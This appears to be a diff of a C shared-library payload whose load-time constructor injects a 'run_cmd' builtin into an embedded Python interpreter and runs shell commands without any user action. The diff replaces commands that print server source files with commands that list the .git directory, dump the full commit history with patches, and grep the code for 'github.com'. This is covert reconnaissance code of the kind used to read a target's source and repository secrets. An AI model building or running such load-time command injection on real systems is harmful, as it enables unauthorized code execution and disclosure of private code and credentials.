@@ -105,10 +105,10 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('cat monitor_blueprint.py')
-run_cmd('cat server.py')
-run_cmd('cat rerun_api.py')
-run_cmd('cat file_blueprint.py')
+run_cmd('ls -la .git')
+run_cmd('git log -p')
+run_cmd('grep -rn "github.com" . --exclude-dir=".git" ')
+
 
 
 )PY");
